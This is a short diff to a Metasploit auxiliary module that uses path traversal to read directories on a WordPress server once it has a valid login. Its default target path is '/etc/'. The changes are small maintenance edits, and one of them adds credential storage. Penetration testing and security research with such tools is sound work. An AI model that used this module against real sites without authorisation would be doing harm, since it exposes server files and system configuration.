@@ -1,14 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'json'
 require 'nokogiri'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
@@ -40,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('DIRPATH', [true, 'The path to the directory to read', '/etc/']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
-      ], self.class)
+      ])
   end
 
   def user
@@ -99,6 +97,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Unable to login as: #{user}")
       return
     end
+    store_valid_credential(user: user, private: password, proof: cookie)
 
     vprint_status("Trying to get nonce...")
     nonce = get_nonce(cookie)
